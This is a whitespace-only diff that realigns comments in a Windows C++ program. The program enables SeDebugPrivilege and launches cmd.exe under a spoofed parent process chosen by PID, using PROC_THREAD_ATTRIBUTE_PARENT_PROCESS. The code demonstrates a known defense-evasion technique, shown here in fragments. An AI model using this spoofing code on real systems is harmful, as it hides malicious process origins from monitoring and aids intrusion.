@@ -23,14 +23,14 @@ static void PrintError(const char* text) {
 
     FormatMessageA(
         FORMAT_MESSAGE_ALLOCATE_BUFFER |  // dwFlags: Allocate a buffer for the message
-        FORMAT_MESSAGE_FROM_SYSTEM |               // dwFlags: Get the message from the system message table
-        FORMAT_MESSAGE_IGNORE_INSERTS,             // dwFlags: Do not expand insert sequences in the message
-        nullptr,                         // lpSource: NULL for system messages
-        err,                          // dwMessageId: The error code to look up
-        0,                           // dwLanguageId: 0 for default language
-        (LPSTR)&buf,                     // lpBuffer: Pointer to variable that receives the allocated buffer pointer
-        0,                                  // nSize: 0 when using FORMAT_MESSAGE_ALLOCATE_BUFFER
-        nullptr);                       // Arguments: NULL for no insert values
+        FORMAT_MESSAGE_FROM_SYSTEM |      // dwFlags: Get the message from the system message table
+        FORMAT_MESSAGE_IGNORE_INSERTS,    // dwFlags: Do not expand insert sequences in the message
+        nullptr,                          // lpSource: NULL for system messages
+        err,                              // dwMessageId: The error code to look up
+        0,                                // dwLanguageId: 0 for default language
+        (LPSTR)&buf,                      // lpBuffer: Pointer to variable that receives the allocated buffer pointer
+        0,                                // nSize: 0 when using FORMAT_MESSAGE_ALLOCATE_BUFFER
+        nullptr);                         // Arguments: NULL for no insert values
 
     if (buf) {   // Strip trailing CR/LF from the message
         char* p = buf;
@@ -50,15 +50,15 @@ static BOOL EnableDebugPrivilege(void) {
     if (!OpenProcessToken(
         GetCurrentProcess(),                    // ProcessHandle: Handle to the process whose token is opened
         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,  // DesiredAccess: Need to adjust privileges and query the token
-        &hToken)) {                               // TokenHandle: Pointer that receives the token handle
+        &hToken)) {                             // TokenHandle: Pointer that receives the token handle
         PrintError("OpenProcessToken (current) failed");
         return FALSE;
     }
 
     if (!LookupPrivilegeValueW(
-        nullptr,           // lpSystemName: NULL for local system
-        L"SeDebugPrivilege",     // lpName: Name of the privilege to look up
-        &luid)) {                // lpLuid: Pointer that receives the LUID for the privilege
+        nullptr,              // lpSystemName: NULL for local system
+        L"SeDebugPrivilege",  // lpName: Name of the privilege to look up
+        &luid)) {             // lpLuid: Pointer that receives the LUID for the privilege
         PrintError("LookupPrivilegeValue(SeDebugPrivilege) failed");
         CloseHandle(hToken);
         return FALSE;
@@ -69,12 +69,12 @@ static BOOL EnableDebugPrivilege(void) {
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;   // Enable the privilege
 
     BOOL ok = AdjustTokenPrivileges(
-        hToken,            // TokenHandle: Handle to the token to modify
-        FALSE,    // DisableAllPrivileges: FALSE so only the specified privilege is changed
-        &tp,                  // NewState: Pointer to TOKEN_PRIVILEGES with the new state
-        sizeof(tp),       // BufferLength: Size of the NewState buffer
-        nullptr,         // PreviousState: NULL when not needed
-        nullptr);         // ReturnLength: NULL when not needed
+        hToken,      // TokenHandle: Handle to the token to modify
+        FALSE,       // DisableAllPrivileges: FALSE so only the specified privilege is changed
+        &tp,         // NewState: Pointer to TOKEN_PRIVILEGES with the new state
+        sizeof(tp),  // BufferLength: Size of the NewState buffer
+        nullptr,     // PreviousState: NULL when not needed
+        nullptr);    // ReturnLength: NULL when not needed
     CloseHandle(hToken);
     if (!ok) {
         PrintError("AdjustTokenPrivileges(SeDebugPrivilege) failed");
@@ -102,8 +102,8 @@ int main(int argc, char* argv[]) {
     // Open the process that will be the (spoofed) parent; handle must have PROCESS_CREATE_PROCESS access right
     HANDLE hParent = OpenProcess(
         PROCESS_CREATE_PROCESS,  // dwDesiredAccess: Required to use this handle as parent in UpdateProcThreadAttribute
-        FALSE,                    // bInheritHandle: Do not inherit the handle
-        (DWORD)pid);                 // dwProcessId: PID of the process to open
+        FALSE,                   // bInheritHandle: Do not inherit the handle
+        (DWORD)pid);             // dwProcessId: PID of the process to open
     if (!hParent) {
         PrintError("OpenProcess(parent) failed");
         return 1;
@@ -112,32 +112,32 @@ int main(int argc, char* argv[]) {
     SIZE_T attrSize = 0;   // Variable that receives the size required for the attribute list
     InitializeProcThreadAttributeList(nullptr, 1, 0, &attrSize);   // Get required size (lpAttributeList NULL)
     LPPROC_THREAD_ATTRIBUTE_LIST attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
-        GetProcessHeap(),   // hHeap: Heap of the current process
-        0,                // dwFlags: 0
-        attrSize);        // dwBytes: Size returned above
+        GetProcessHeap(),  // hHeap: Heap of the current process
+        0,                 // dwFlags: 0
+        attrSize);         // dwBytes: Size returned above
     if (!attr) {
         PrintError("HeapAlloc(attribute list) failed");
         CloseHandle(hParent);
         return 1;
     }
     if (!InitializeProcThreadAttributeList(
-        attr,  // lpAttributeList: Buffer to initialize
-        1,    // dwAttributeCount: Number of attributes we will add (one: parent process)
+        attr,          // lpAttributeList: Buffer to initialize
+        1,             // dwAttributeCount: Number of attributes we will add (one: parent process)
         0,             // dwFlags: Reserved, must be 0
-        &attrSize)) {   // lpSize: Size of the buffer
+        &attrSize)) {  // lpSize: Size of the buffer
         PrintError("InitializeProcThreadAttributeList failed");
         HeapFree(GetProcessHeap(), 0, attr);
         CloseHandle(hParent);
         return 1;
     }
     if (!UpdateProcThreadAttribute(
-        attr,                            // lpAttributeList: The attribute list to update
-        0,                                       // dwFlags: Reserved, must be 0
+        attr,                                  // lpAttributeList: The attribute list to update
+        0,                                     // dwFlags: Reserved, must be 0
         PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,  // Attribute: Set the parent process of the new process
-        &hParent,                                // lpValue: Pointer to the handle of the spoofed parent process
-        sizeof(HANDLE),                           // cbSize: Size of the handle
-        nullptr,                         // lpPreviousValue: NULL when not needed
-        nullptr)) {                         // lpReturnSize: NULL when not needed
+        &hParent,                              // lpValue: Pointer to the handle of the spoofed parent process
+        sizeof(HANDLE),                        // cbSize: Size of the handle
+        nullptr,                               // lpPreviousValue: NULL when not needed
+        nullptr)) {                            // lpReturnSize: NULL when not needed
         PrintError("UpdateProcThreadAttribute(PARENT_PROCESS) failed");
         DeleteProcThreadAttributeList(attr);
         HeapFree(GetProcessHeap(), 0, attr);
@@ -152,16 +152,16 @@ int main(int argc, char* argv[]) {
     wchar_t cmdLine[] = L"cmd.exe";               // Command line for the child process (writable buffer for CreateProcessW)
 
     if (!CreateProcessW(
-            nullptr,                           // lpApplicationName: NULL; use lpCommandLine
-            cmdLine,                               // lpCommandLine: Command line to execute (cmd.exe)
-            nullptr,                         // lpProcessAttributes: Default security
+            nullptr,                          // lpApplicationName: NULL; use lpCommandLine
+            cmdLine,                          // lpCommandLine: Command line to execute (cmd.exe)
+            nullptr,                          // lpProcessAttributes: Default security
             nullptr,                          // lpThreadAttributes: Default security
-            FALSE,                               // bInheritHandles: Do not inherit handles
+            FALSE,                            // bInheritHandles: Do not inherit handles
             EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,   // dwCreationFlags: Use STARTUPINFOEX and new console
-            nullptr,                               // lpEnvironment: Use parent's environment
+            nullptr,                          // lpEnvironment: Use parent's environment
             nullptr,                          // lpCurrentDirectory: Use parent's current directory
-            (LPSTARTUPINFOW)&si,                   // lpStartupInfo: Extended startup info with spoofed parent
-            &pi)) {                         // lpProcessInformation: Receives new process/thread info
+            (LPSTARTUPINFOW)&si,              // lpStartupInfo: Extended startup info with spoofed parent
+            &pi)) {                           // lpProcessInformation: Receives new process/thread info
         PrintError("CreateProcess failed");
         DeleteProcThreadAttributeList(attr);
         HeapFree(GetProcessHeap(), 0, attr);
@@ -177,3 +177,4 @@ int main(int argc, char* argv[]) {
     CloseHandle(pi.hThread);
     return 0;
 }
+
